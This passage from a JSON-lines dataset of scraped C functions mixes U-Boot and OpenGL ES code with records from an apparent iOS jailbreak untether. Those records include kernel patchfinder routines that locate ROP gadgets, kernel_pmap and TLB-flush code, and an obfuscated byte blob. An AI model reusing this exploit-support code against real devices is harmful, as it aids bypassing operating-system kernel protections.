unacceptable\n * CFGDONE bit in STATUSREG is not set to 1.\n */\n#ifndef SYSTEMACE_CONFIG_FPGA\n\t\t/* Reset the configruation controller */\n\t\tval = ace_readw(0x18);\n\t\tval |= 0x0080;\n\t\tace_writew(val, 0x18);\n#endif\n\n\t\tretry = trans * 16;\n\t\twhile (retry > 0) {\n\t\t\tint idx;\n\n\t\t\t/* Wait for buffer to become ready. */\n\t\t\twhile (!(ace_readw(0x04) & 0x0020)) {\n\t\t\t\tudelay(100);\n\t\t\t}\n\n\t\t\t/* Read 16 words of 2bytes from the sector buffer. */\n\t\t\tfor (idx = 0; idx < 16; idx += 1) {\n\t\t\t\tunsigned short val = ace_readw(0x40);\n\t\t\t\t*dp++ = val & 0xff;\n\t\t\t\t*dp++ = (val >> 8) & 0xff;\n\t\t\t}\n\n\t\t\tretry -= 1;\n\t\t}\n\n\t\t/* Clear the configruation controller reset */\n\t\tval = ace_readw(0x18);\n\t\tval &= ~0x0080;\n\t\tace_writew(val, 0x18);\n\n\t\t/* Count the blocks we transfer this time. */\n\t\tstart += trans;\n\t\tblk_countdown -= trans;\n\t}\n\n\trelease_cf_lock();\n\n\treturn blkcnt;\n}", "path": "drivers\\block\\systemace.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/*\n * Breath some life into the CPU...\n *\n * Set up the memory map,\n * initialize a bunch of registers,\n * initialize the UPM's\n */\n", "func_signal": "void cpu_init_f(void)", "code": "{\n\tvolatile scm1_t *scm1 = (scm1_t *) MMAP_SCM1;\n\tvolatile gpio_t *gpio = (gpio_t *) MMAP_GPIO;\n\tvolatile fbcs_t *fbcs = (fbcs_t *) MMAP_FBCS;\n\n\tscm1->mpr = 0x77777777;\n\tscm1->pacra = 0;\n\tscm1->pacrb = 0;\n\tscm1->pacrc = 0;\n\tscm1->pacrd = 0;\n\tscm1->pacre = 0;\n\tscm1->pacrf = 0;\n\tscm1->pacrg = 0;\n\n\t/* FlexBus */\n\tgpio->par_be =\n\t    GPIO_PAR_BE_BE3_BE3 | GPIO_PAR_BE_BE2_BE2 | GPIO_PAR_BE_BE1_BE1 |\n\t    GPIO_PAR_BE_BE0_BE0;\n\tgpio->par_fbctl =\n\t    GPIO_PAR_FBCTL_OE | GPIO_PAR_FBCTL_TA_TA | GPIO_PAR_FBCTL_RW_RW |\n\t    GPIO_PAR_FBCTL_TS_TS;\n\n#if !defined(CONFIG_CF_SBF)\n#if (defined(CONFIG_SYS_CS0_BASE) && defined(CONFIG_SYS_CS0_MASK) && defined(CONFIG_SYS_CS0_CTRL))\n\tfbcs->csar0 = CONFIG_SYS_CS0_BASE;\n\tfbcs->cscr0 = CONFIG_SYS_CS0_CTRL;\n\tfbcs->csmr0 = CONFIG_SYS_CS0_MASK;\n#endif\n#endif\n\n#if (defined(CONFIG_SYS_CS1_BASE) && defined(CONFIG_SYS_CS1_MASK) && defined(CONFIG_SYS_CS1_CTRL))\n\t/* Latch chipselect */\n\tfbcs->csar1 = CONFIG_SYS_CS1_BASE;\n\tfbcs->cscr1 = CONFIG_SYS_CS1_CTRL;\n\tfbcs->csmr1 = CONFIG_SYS_CS1_MASK;\n#endif\n\n#if (defined(CONFIG_SYS_CS2_BASE) && defined(CONFIG_SYS_CS2_MASK) && defined(CONFIG_SYS_CS2_CTRL))\n\tfbcs->csar2 = CONFIG_SYS_CS2_BASE;\n\tfbcs->cscr2 = CONFIG_SYS_CS2_CTRL;\n\tfbcs->csmr2 = CONFIG_SYS_CS2_MASK;\n#endif\n\n#if (defined(CONFIG_SYS_CS3_BASE) && defined(CONFIG_SYS_CS3_MASK) && defined(CONFIG_SYS_CS3_CTRL))\n\tfbcs->csar3 = CONFIG_SYS_CS3_BASE;\n\tfbcs->cscr3 = CONFIG_SYS_CS3_CTRL;\n\tfbcs->csmr3 = CONFIG_SYS_CS3_MASK;\n#endif\n\n#if (defined(CONFIG_SYS_CS4_BASE) && defined(CONFIG_SYS_CS4_MASK) && defined(CONFIG_SYS_CS4_CTRL))\n\tfbcs->csar4 = CONFIG_SYS_CS4_BASE;\n\tfbcs->cscr4 = CONFIG_SYS_CS4_CTRL;\n\tfbcs->csmr4 = CONFIG_SYS_CS4_MASK;\n#endif\n\n#if (defined(CONFIG_SYS_CS5_BASE) && defined(CONFIG_SYS_CS5_MASK) && defined(CONFIG_SYS_CS5_CTRL))\n\tfbcs->csar5 = CONFIG_SYS_CS5_BASE;\n\tfbcs->cscr5 = CONFIG_SYS_CS5_CTRL;\n\tfbcs->csmr5 = CONFIG_SYS_CS5_MASK;\n#endif\n\n#ifdef CONFIG_FSL_I2C\n\tgpio->par_feci2c = GPIO_PAR_FECI2C_SCL_SCL | GPIO_PAR_FECI2C_SDA_SDA;\n#endif\n\n\ticache_enable();\n}", "path": "cpu\\mcf5445x\\cpu_init.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/* ############################################################################\n   Sends a command to the MMC/SD-card\n   ######################################################################### */\n", "func_signal": "static unsigned char Write_Command_MMC (unsigned char *CMD)", "code": "{\n\tunsigned char a, tmp = 0xff;\n\tunsigned short int Timeout = 0;\n\n\tMMC_Disable();\n\tspi_write(0xFF);\n\tMMC_Enable();\n\n\tfor (a = 0; a < 0x06; a++)\n\t\tspi_write(*CMD++);\n\n\twhile (tmp == 0xff) {\n\t\ttmp = spi_read();\n\t\tif (Timeout++ > 5000)\n\t\t  break;\n\t}\n\n\treturn (tmp);\n}", "path": "cpu\\arm720t\\lpc2292\\mmc_hw.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/*\n * Miscelaneous platform dependent initialisations\n */\n", "func_signal": "int board_init (void)", "code": "{\n\t/* memory and cpu-speed are setup before relocation */\n\t/* so we do _nothing_ here */\n\n\t/* arch number of Lubbock-Board */\n\tgd->bd->bi_arch_number = MACH_TYPE_PXA_IDP;\n\n\t/* adress of boot parameters */\n\tgd->bd->bi_boot_params = 0xa0000100;\n\n\t/* turn on serial ports */\n\t*(volatile unsigned int *)(PXA_CS5_PHYS + 0x03C0002c) = 0x13;\n\n\t/* set PWM for LCD */\n\t/* a value that works is 60Hz, 77% duty cycle */\n\tCKEN |= CKEN0_PWM0;\n\tPWM_CTRL0 = 0x3f;\n\tPWM_PERVAL0 = 0x3ff;\n\tPWM_PWDUTY0 = 792;\n\n\t/* clear reset to AC97 codec */\n\tCKEN |= CKEN2_AC97;\n\tGCR = GCR_COLD_RST;\n\n\t/* enable LCD backlight */\n\t/* *(volatile unsigned int *)(PXA_CS5_PHYS + 0x03C00030) = 0x7; */\n\n\t/* test display */\n\t/* lcd_puts(\"This is a test\\nTest #2\\n\"); */\n\n\treturn 0;\n}", "path": "board\\pxa255_idp\\pxa_idp.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/* ############################################################################\n   Routine to read the CID register from the MMC/SD-card (16 bytes)\n   ######################################################################### */\n", "func_signal": "void MMC_Read_Block(unsigned char *CMD, unsigned char *Buffer, unsigned short\n\tint Bytes)", "code": "{\n\tunsigned short int a;\n\n\tspi_lock();\n\tmmc_spi_cfg();\n\tMMC_Enable();\n\n\tif (Write_Command_MMC(CMD) != 0) {\n\t\tMMC_Disable();\n\t\tspi_unlock();\n\t\treturn;\n\t}\n\n\twhile (spi_read() != 0xfe) {};\n\tfor (a = 0; a < Bytes; a++)\n\t\t*Buffer++ = spi_read();\n\n\t/* Read the CRC-byte */\n\tspi_read(); /* CRC - byte is discarded */\n\tspi_read(); /* CRC - byte is discarded */\n\t/* set MMC_Chip_Select to high (MMC/SD-card Inaktiv) */\n\tMMC_Disable();\n\tspi_unlock();\n\n\treturn;\n}", "path": "cpu\\arm720t\\lpc2292\\mmc_hw.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/* #########################################################################\n   Routine to read the CSD register from the MMC/SD-card (16 bytes)\n   ######################################################################### */\n", "func_signal": "unsigned char mmc_read_csd (unsigned char *Buffer)", "code": "{\n\t/* Command to read the CSD register */\n\tunsigned char CMD[] = {0x49, 0x00, 0x00, 0x00, 0x00, 0xFF};\n\n\tMMC_Read_Block(CMD, Buffer, 16);\n\n\treturn (0);\n}", "path": "cpu\\arm720t\\lpc2292\\mmc_hw.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/* INLINED CODE */\n", "func_signal": "int thumb_expand_imm_c(uint16_t imm12)", "code": "{\n    if(bit_range(imm12, 11, 10) == 0)\n    {\n        switch(bit_range(imm12, 9, 8))\n        {\n            case 0:\n                return bit_range(imm12, 7, 0);\n            case 1:\n                return (bit_range(imm12, 7, 0) << 16) | bit_range(imm12, 7, 0);\n            case 2:\n                return (bit_range(imm12, 7, 0) << 24) | (bit_range(imm12, 7, 0) << 8);\n            case 3:\n                return (bit_range(imm12, 7, 0) << 24) | (bit_range(imm12, 7, 0) << 16) | (bit_range(imm12, 7, 0) << 8) | bit_range(imm12, 7, 0);\n            default:\n                return 0;\n        }\n    } else\n    {\n        uint32_t unrotated_value = 0x80 | bit_range(imm12, 6, 0);\n        return ror(unrotated_value, bit_range(imm12, 11, 7));\n    }\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_e5c8 - (C) code from planetbeing's patchfinder */\n", "func_signal": "uint32_t find_str_r1_r2_bx_lr(uint32_t region, uint8_t* kdata, size_t ksize)", "code": "{\n    const uint8_t search[] = {0x11, 0x60, 0x70, 0x47};\n    void* ptr = memmem(kdata, ksize, search, sizeof(search)) + 1;\n    if(!ptr)\n        return 0;\n\n    return ((uintptr_t)ptr) - ((uintptr_t)kdata);\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* INLINED CODE from planetbeing's patchfinder */\n", "func_signal": "int insn_is_add_reg(uint16_t* i)", "code": "{\n    if((*i & 0xFE00) == 0x1800)\n        return 1;\n    else if((*i & 0xFF00) == 0x4400)\n        return 1;\n    else if((*i & 0xFFE0) == 0xEB00)\n        return 1;\n    else\n        return 0;\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_e5f4 - code in style of planetbeing's patchfinder */\n", "func_signal": "uint32_t find_mov_r0_r1_bx_lr(uint32_t region, uint8_t* kdata, size_t ksize)", "code": "{\n    const uint8_t search[] = {0x08, 0x46, 0x70, 0x47};\n    void* ptr = memmem(kdata, ksize, search, sizeof(search)) + 1;\n    if(!ptr)\n        return 0;\n\n    return ((uintptr_t)ptr) - ((uintptr_t)kdata);\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_e568 */\n", "func_signal": "void setup_watchdog_timer(int value)", "code": "{\n\tio_service_t timerservice = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(\"IOWatchDogTimer\"));\n\tif (timerservice != 0) {\n\t\tCFNumberRef cfval = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &value);\n\t\tIORegistryEntrySetCFProperties(timerservice, cfval);\n\t\tIOObjectRelease(timerservice);\n\t\tCFRelease(cfval);\n\t}\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_ec5c - (C) code from planetbeing's patchfinder */\n", "func_signal": "int insn_add_reg_rm(uint16_t* i)", "code": "{\n    if((*i & 0xFE00) == 0x1800)\n        return (*i >> 6) & 7;\n    else if((*i & 0xFF00) == 0x4400)\n        return (*i >> 3) & 0xF;\n    else if((*i & 0xFFE0) == 0xEB00)\n        return *(i + 1) & 0xF;\n    else\n        return 0;\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* InitFunc_0 */\n", "func_signal": "__attribute__((constructor))\nvoid InitFunc()", "code": "{\n\tdatablob[0] = 0xD8;\n\tdatablob[1] = 0xC5;\n\tdatablob[2] = 0xD0;\n\tdatablob[3] = 0xC9;\n\tdatablob[4] = 0xFA;\n\tdatablob[5] = 0xD1;\n\tdatablob[6] = 0xFA;\n\tdatablob[7] = 0xE1;\n\tdatablob[8] = 0xD;\n\tdatablob[9] = 0xE5;\n\tdatablob[10] = 0xF3;\n\tdatablob[11] = 0xA0;\n\tdatablob[12] = 0xE3;\n\tdatablob[13] = 0xD2;\n\tdatablob[14] = 0xFA;\n\tdatablob[15] = 0xD8;\n\tdatablob[16] = 0xC5;\n\tdatablob[17] = 0xC8;\n\tdatablob[18] = 0xC5;\n\tdatablob[19] = 8;\n\tdatablob[20] = 0xA6;\n\tdatablob[21] = 0xF4;\n\tdatablob[22] = 0xE0;\n\tdatablob[23] = 0xF8;\n\tdatablob[24] = 0xEF;\n\tdatablob[25] = 0xE6;\n\tdatablob[26] = 0x9E;\n\tdatablob[27] = 0xE7;\n\tdatablob[28] = 0xF8;\n\tdatablob[29] = 0xD8;\n\tdatablob[30] = 0xC5;\n\tdatablob[31] = 0xC8;\n\tdatablob[32] = 0xC5;\n\tdatablob[33] = 8;\n\tdatablob[34] = 0xBB;\n\tdatablob[35] = 0xE1;\n\tdatablob[36] = 0xF2;\n\tdatablob[37] = 0xF7;\n\tdatablob[38] = 0xF0;\n\tdatablob[39] = 5;\n\tdatablob[40] = 0xA4;\n\tdatablob[41] = 0xFA;\n\tdatablob[42] = 0xCA;\n\tdatablob[43] = 0xD1;\n\tdatablob[44] = 0xE9;\n\tdatablob[45] = 0xB4;\n\tdatablob[46] = 4;\n\tdatablob[47] = 0xD8;\n\tdatablob[48] = 0xC5;\n\tdatablob[49] = 0xC8;\n\tdatablob[50] = 0xC5;\n\tdatablob[51] = 8;\n\tdatablob[52] = 0xB4;\n\tdatablob[53] = 0xF8;\n\tdatablob[54] = 0xEF;\n\tdatablob[55] = 0xFE;\n\tdatablob[56] = 0xF1;\n\tdatablob[57] = 0xFB;\n\tdatablob[58] = 0xAD;\n\tdatablob[59] = 9;\n\tdatablob[60] = 0xD4;\n\tdatablob[61] = 0xD1;\n\tdatablob[62] = 0xE7;\n\tdatablob[63] = 0xB9;\n\tdatablob[64] = 0xB0;\n\tdatablob[65] = 0;\n\tdatablob[66] = 0xD8;\n\tdatablob[67] = 0xC5;\n\tdatablob[68] = 0xD3;\n\tdatablob[69] = 0xAF;\n\tdatablob[70] = 0xE7;\n\tdatablob[71] = 0xC6;\n\tdatablob[72] = 14;\n\tdatablob[73] = 0xF9;\n\tdatablob[74] = 0xFA;\n\tdatablob[75] = 0xDF;\n\tdatablob[76] = 0xF2;\n\tdatablob[77] = 0xB3;\n\tdatablob[78] = 9;\n\tdatablob[79] = 0xD4;\n\tdatablob[80] = 0xD9;\n\tdatablob[81] = 0xF9;\n\tdatablob[82] = 0x9E;\n\tdatablob[83] = 4;\n\tdatablob[84] = 0xBD;\n\tdatablob[85] = 0x9F;\n\tdatablob[86] = 0xB0;\n\tdatablob[87] = 0xAB;\n\tdatablob[88] = 0xFA;\n\tdatablob[89] = 0xCC;\n\tdatablob[90] = 0x13;\n\tdatablob[91] = 0xF2;\n\tdatablob[92] = 0xE4;\n\tdatablob[93] = 0xE1;\n\tdatablob[94] = 0xE6;\n\tdatablob[95] = 0xA8;\n\tdatablob[96] = 0xFC;\n\tdatablob[97] = 0xCC;\n\tdatablob[98] = 0xCF;\n\tdatablob[99] = 0xFA;\n\tdatablob[100] = 0xF;\n\tdatablob[101] = 0xBD;\n\tdatablob[102] = 0x9F;\n\tdatablob[103] = 0xB0;\n\tdatablob[104] = 0xAB;\n\tdatablob[105] = 0xFA;\n\tdatablob[106] = 0xCC;\n\tdatablob[107] = 0x18;\n\tdatablob[108] = 0xFB;\n\tdatablob[109] = 0xDD;\n\tdatablob[110] = 0xDF;\n\tdatablob[111] = 0xE6;\n\tdatablob[112] = 0xB1;\n\tdatablob[113] = 0xEB;\n\tdatablob[114] = 0xD4;\n\tdatablob[115] = 0xFA;\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_ea9c - (C) code from planetbeing's patchfinder */\n", "func_signal": "static uint32_t find_pc_rel_value(uint32_t region, uint8_t* kdata, size_t ksize, uint16_t* insn, int reg)", "code": "{\n    // Find the last instruction that completely wiped out this register\n    int found = 0;\n    uint16_t* current_instruction = insn;\n    while((uintptr_t)current_instruction > (uintptr_t)kdata)\n    {\n        if(insn_is_32bit(current_instruction - 2))\n        {\n            current_instruction -= 2;\n        } else\n        {\n            --current_instruction;\n        }\n\n        if(insn_is_mov_imm(current_instruction) && insn_mov_imm_rd(current_instruction) == reg)\n        {\n            found = 1;\n            break;\n        }\n\n        if(insn_is_ldr_literal(current_instruction) && insn_ldr_literal_rt(current_instruction) == reg)\n        {\n            found = 1;\n            break;\n        }\n    }\n\n    if(!found)\n        return 0;\n\n    // Step through instructions, executing them as a virtual machine, only caring about instructions that affect the target register and are commonly used for PC-relative addressing.\n    uint32_t value = 0;\n    while((uintptr_t)current_instruction < (uintptr_t)insn)\n    {\n        if(insn_is_mov_imm(current_instruction) && insn_mov_imm_rd(current_instruction) == reg)\n        {\n            value = insn_mov_imm_imm(current_instruction);\n        } else if(insn_is_ldr_literal(current_instruction) && insn_ldr_literal_rt(current_instruction) == reg)\n        {\n            value = *(uint32_t*)(kdata + (((((uintptr_t)current_instruction - (uintptr_t)kdata) + 4) & 0xFFFFFFFC) + insn_ldr_literal_imm(current_instruction)));\n        } else if(insn_is_movt(current_instruction) && insn_movt_rd(current_instruction) == reg)\n        {\n            value |= insn_movt_imm(current_instruction) << 16;\n        } else if(insn_is_add_reg(current_instruction) && insn_add_reg_rd(current_instruction) == reg)\n        {\n            if(insn_add_reg_rm(current_instruction) != 15 || insn_add_reg_rn(current_instruction) != reg)\n            {\n                // Can't handle this kind of operation!\n                return 0;\n            }\n\n            value += ((uintptr_t)current_instruction - (uintptr_t)kdata) + 4;\n        }\n\n        current_instruction += insn_is_32bit(current_instruction) ? 2 : 1;\n    }\n\n    return value;\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_e888 - (C) code from planetbeing's patchfinder */\n", "func_signal": "uint32_t find_pmap_location(uint32_t region, uint8_t* kdata, size_t ksize)", "code": "{\n    // Find location of the pmap_map_bd string.\n    uint8_t* pmap_map_bd = memmem(kdata, ksize, \"\\\"pmap_map_bd\\\"\", sizeof(\"\\\"pmap_map_bd\\\"\"));\n    if(!pmap_map_bd)\n        return 0;\n\n    // Find a reference to the pmap_map_bd string. That function also references kernel_pmap\n    uint16_t* ptr = find_literal_ref(region, kdata, ksize, (uint16_t*) kdata, (uintptr_t)pmap_map_bd - (uintptr_t)kdata);\n    if(!ptr)\n        return 0;\n\n    // Find the end of it.\n    const uint8_t search_function_end[] = {0xF0, 0xBD};\n    ptr = memmem(ptr, ksize - ((uintptr_t)ptr - (uintptr_t)kdata), search_function_end, sizeof(search_function_end));\n    if(!ptr)\n        return 0;\n\n    // Find the last BL before the end of it. The third argument to it should be kernel_pmap\n    uint16_t* bl = find_last_insn_matching(region, kdata, ksize, ptr, insn_is_bl);\n    if(!bl)\n        return 0;\n\n    // Find the last LDR R2, [R*] before it that's before any branches. If there are branches, then we have a version of the function that assumes kernel_pmap instead of being passed it.\n    uint16_t* ldr_r2 = NULL;\n    uint16_t* current_instruction = bl;\n    while((uintptr_t)current_instruction > (uintptr_t)kdata)\n    {\n        if(insn_is_32bit(current_instruction - 2) && !insn_is_32bit(current_instruction - 3))\n        {\n            current_instruction -= 2;\n        } else\n        {\n            --current_instruction;\n        }\n\n        if(insn_ldr_imm_rt(current_instruction) == 2 && insn_ldr_imm_imm(current_instruction) == 0)\n        {\n            ldr_r2 = current_instruction;\n            break;\n        } else if(insn_is_b_conditional(current_instruction) || insn_is_b_unconditional(current_instruction))\n        {\n            break;\n        }\n    }\n\n    // The function has a third argument, which must be kernel_pmap. Find out its address\n    if(ldr_r2)\n        return find_pc_rel_value(region, kdata, ksize, ldr_r2, insn_ldr_imm_rn(ldr_r2));\n\n    // The function has no third argument, Follow the BL.\n    uint32_t imm32 = insn_bl_imm32(bl);\n    uint32_t target = ((uintptr_t)bl - (uintptr_t)kdata) + 4 + imm32;\n    if(target > ksize)\n        return 0;\n\n    // Find the first PC-relative reference in this function.\n    int found = 0;\n    int rd;\n    current_instruction = (uint16_t*)(kdata + target);\n    while((uintptr_t)current_instruction < (uintptr_t)(kdata + ksize))\n    {\n        if(insn_is_add_reg(current_instruction) && insn_add_reg_rm(current_instruction) == 15)\n        {\n            found = 1;\n            rd = insn_add_reg_rd(current_instruction);\n            current_instruction += insn_is_32bit(current_instruction) ? 2 : 1;\n            break;\n        }\n\n        current_instruction += insn_is_32bit(current_instruction) ? 2 : 1;\n    }\n\n    if(!found)\n        return 0;\n\n    return find_pc_rel_value(region, kdata, ksize, current_instruction, rd);\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_ec94 - (C) code from planetbeing's patchfinder */\n", "func_signal": "int insn_add_reg_rd(uint16_t* i)", "code": "{\n    if((*i & 0xFE00) == 0x1800)\n        return (*i & 7);\n    else if((*i & 0xFF00) == 0x4400)\n        return (*i & 7) | ((*i & 0x80) >> 4) ;\n    else if((*i & 0xFFE0) == 0xEB00)\n        return (*(i + 1) >> 8) & 0xF;\n    else\n        return 0;\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_f578 - (C) code from planetbeing's patchfinder */\n", "func_signal": "int insn_is_push(uint16_t* i)", "code": "{\n    if((*i & 0xFE00) == 0xB400)\n        return 1;\n    else if(*i == 0xE92D)\n        return 1;\n    else if(*i == 0xF84D && (*(i + 1) & 0x0FFF) == 0x0D04)\n        return 1;\n    else\n        return 0;\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_e620 - code in style of planetbeing's patchfinder */\n", "func_signal": "uint32_t find_ldr_r0_r1_bx_lr(uint32_t region, uint8_t* kdata, size_t ksize)", "code": "{\n    const uint8_t search[] = {0x08, 0x68, 0x70, 0x47};\n    void* ptr = memmem(kdata, ksize, search, sizeof(search)) + 1;\n    if(!ptr)\n        return 0;\n\n    return ((uintptr_t)ptr) - ((uintptr_t)kdata);\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_e834 - (C) code from planetbeing's patchfinder */\n", "func_signal": "uint16_t* find_literal_ref(uint32_t region, uint8_t* kdata, size_t ksize, uint16_t* insn, uint32_t address)", "code": "{\n    uint16_t* current_instruction = insn;\n    uint32_t value[16];\n    memset(value, 0, sizeof(value));\n\n    while((uintptr_t)current_instruction < (uintptr_t)(kdata + ksize))\n    {\n        if(insn_is_mov_imm(current_instruction))\n        {\n            value[insn_mov_imm_rd(current_instruction)] = insn_mov_imm_imm(current_instruction);\n        } else if(insn_is_ldr_literal(current_instruction))\n        {\n            uintptr_t literal_address  = (uintptr_t)kdata + ((((uintptr_t)current_instruction - (uintptr_t)kdata) + 4) & 0xFFFFFFFC) + insn_ldr_literal_imm(current_instruction);\n            if(literal_address >= (uintptr_t)kdata && (literal_address + 4) <= ((uintptr_t)kdata + ksize))\n            {\n                value[insn_ldr_literal_rt(current_instruction)] = *(uint32_t*)(literal_address);\n            }\n        } else if(insn_is_movt(current_instruction))\n        {\n            value[insn_movt_rd(current_instruction)] |= insn_movt_imm(current_instruction) << 16;\n        } else if(insn_is_add_reg(current_instruction))\n        {\n            int reg = insn_add_reg_rd(current_instruction);\n            if(insn_add_reg_rm(current_instruction) == 15 && insn_add_reg_rn(current_instruction) == reg)\n            {\n                value[reg] += ((uintptr_t)current_instruction - (uintptr_t)kdata) + 4;\n                if(value[reg] == address)\n                {\n                    return current_instruction;\n                }\n            }\n        }\n\n        current_instruction += insn_is_32bit(current_instruction) ? 2 : 1;\n    }\n\n    return NULL;\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_cedc */\n", "func_signal": "int copy_dylibs()", "code": "{\n\tmkdir(\"/var/mobile/Media/install\", 0777u);\n\tchown(\"/var/mobile/Media/install\", 0765u, 0765u);\n\tcopy_file(\"/var/mobile/Media/install/libmis.dylib\", \"/usr/lib/libmis.dylib\");\n\tcopy_file(\"/var/mobile/Media/install/xpcd_cache.dylib\", \"/usr/lib/xpcd_cache.dylib\");\n\treturn 0;\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_cc98 */\n", "func_signal": "int write_file(char *path, const void *buffer, size_t size)", "code": "{\n\tint fd;\n\n\tfd = open(path, O_WRONLY|O_TRUNC|O_CREAT, 0644);\n\tif ( fd < 0 )\n\t{\n\t\treturn -1;\n\t}\n\t\n\tif ( write(fd, buffer, size) > -1 )\n\t{\n\t\tclose(fd);\n\t\treturn 0;\n\t}\n\n\twhile ( *__error() == EAGAIN || *__error() == EINTR )\n\t{\n\t\tif ( write(fd, buffer, size) >= 0 )\n\t\t{\n\t\t\tclose(fd);\n\t\t\treturn 0;\n\t\t}\n\t}\n\t\n\tclose(fd);\n\treturn -1;\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_104a8 - (C) code from planetbeing's patchfinder */\n", "func_signal": "int insn_ldr_literal_imm(uint16_t* i)", "code": "{\n    if((*i & 0xF800) == 0x4800)\n        return (*i & 0xF) << 2;\n    else if((*i & 0xFF7F) == 0xF85F)\n        return (*(i + 1) & 0xFFF) * (((*i & 0x0800) == 0x0800) ? 1 : -1);\n    else\n        return 0;\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_ce0c */\n", "func_signal": "int deltree(char *directory)", "code": "{\n\tDIR *dirh;\n\tstruct dirent *entry;\n\tchar path[2048];\n\n\tdirh = opendir(directory);\n\tif ( dirh == NULL ) {\n\t\treturn -1;\n\t}\n\t\n\tfor ( entry = readdir(dirh); entry; entry = readdir(dirh) )\n\t{\n\t\tif ( strcmp(&entry->d_name[0], \".\") && strcmp(&entry->d_name[0], \"..\") ) {\n\t\t\tstrcpy(path, directory);\n\t\t\tstrcat(path, \"/\");\n\t\t\tstrcat(path, &entry->d_name[0]);\n\t\t\tif ( entry->d_type == DT_DIR ) {\n\t\t\t\tdeltree(path);\n\t\t\t} else {\n\t\t\t\tunlink(path);\n\t\t\t}\n\t\t}\n\t}\n\tclosedir(dirh);\n\treturn (rmdir(directory));\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* INLINED CODE from planetbeing's patchfinder */\n", "func_signal": "int insn_ldr_literal_rt(uint16_t* i)", "code": "{\n    if((*i & 0xF800) == 0x4800)\n        return (*i >> 8) & 7;\n    else if((*i & 0xFF7F) == 0xF85F)\n        return (*(i + 1) >> 12) & 0xF;\n    else\n        return 0;\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* INLINED CODE */\n", "func_signal": "uint32_t bit_range(uint32_t x, int start, int end)", "code": "{\n    x = (x << (31 - start)) >> (31 - start);\n    x = (x >> end);\n    return x;\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/* sub_e674 - (C) code from planetbeing's patchfinder */\n", "func_signal": "uint32_t find_invalidate_tlb(uint32_t region, uint8_t* kdata, size_t ksize)", "code": "{\n    const uint8_t search[] = {0x00, 0x00, 0xA0, 0xE3, 0x17, 0x0F, 0x08, 0xEE};\n    void* ptr = memmem(kdata, ksize, search, sizeof(search));\n    if(!ptr)\n        return 0;\n\n    return ((uintptr_t)ptr) - ((uintptr_t)kdata);\n}", "path": "untether.c", "repo_name": "stefanesser/opensource_taig", "stars": 128, "license": "None", "language": "c", "size": 168}
{"docstring": "/**\n * Function for initialization.\n */\n", "func_signal": "GLUSboolean init(GLUSvoid)", "code": "{\n    // The background will just cleared with blue color.\n    glClearColor(0.0f, 0.0f, 1.0f, 0.0f);\n\n    return GLUS_TRUE;\n}", "path": "Example01_ES2\\src\\main.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
